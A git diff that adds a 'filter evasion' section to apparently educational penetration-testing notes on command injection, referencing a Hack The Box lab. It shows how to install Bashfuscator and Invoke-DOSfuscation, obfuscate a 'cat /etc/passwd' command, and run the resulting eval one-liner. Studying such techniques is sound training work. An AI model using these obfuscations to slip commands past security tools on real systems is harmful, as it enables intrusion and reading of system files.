@@ -180,5 +180,42 @@ We can also get inspiration from [PayloadAllTheThings](https://github.com/swissk
 #### Windows
 - There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret `^` character. E.g. `who^ami`
 
+## Evasion Tools
+If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools.
+### Linux (Bashfuscator)
+A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
+```
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+```
+Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the -h help menu.
+- We can start by simply providing the command we want to obfuscate with the -c flag:
+  ```
+  ./bashfuscator -c 'cat /etc/passwd'
+  ```
+  However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:
+  ```
+  ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+  ```
+  We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:
+  ```
+  bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
+  ```
+### Windows (DOSfuscation)
+There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation).
+In Powershell:
+```
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+```
+We can even use tutorial to see an example of how the tool works. Once we are set, we can start using the tool, as follows:
+```
+SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+encoding
+```
 
 
